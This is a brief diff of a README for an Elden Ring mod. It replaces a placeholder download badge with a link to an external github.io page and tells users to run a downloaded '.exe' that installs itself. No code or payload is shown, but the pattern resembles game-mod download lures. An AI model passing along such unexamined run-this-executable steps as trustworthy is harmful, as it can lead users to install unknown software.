@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file – the mod will be automatically installed into your Elden Ring mods folder.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://the-convergence-elden-ring.github.io/.github/)
 
 ## 📸 Overview
   <img width="1900" height="1000" alt="elden-ring-convergence-new-classes" src="https://github.com/user-attachments/assets/90d48fa2-05d5-4d41-bad9-fb3cb29d61f2" />
